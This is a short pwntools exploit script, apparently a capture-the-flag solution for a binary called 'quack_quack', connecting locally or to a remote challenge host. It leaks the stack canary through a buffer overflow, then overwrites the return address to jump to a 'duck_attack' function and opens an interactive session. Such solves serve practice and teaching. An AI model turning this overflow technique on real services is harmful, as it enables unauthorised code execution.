#!/usr/bin/env python3

from pwn import *

exe = ELF("quack_quack_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.63.241", 57073)

    return r


def main():
    r = conn()

    r.sendlineafter(b"> ", b"A" * 89 + b"Quack Quack ")
    r.recvuntil(b"Quack Quack ")
    canary = u64(r.recv(7).rjust(8, b"\x00"))
    log.info(f"canary: 0x{canary:x}")

    r.sendlineafter(b"> ", b"A" * 88 + p64(canary) + b"B" * 8 + p64(exe.sym.duck_attack))
    r.interactive("$ ")


if __name__ == "__main__":
    main()
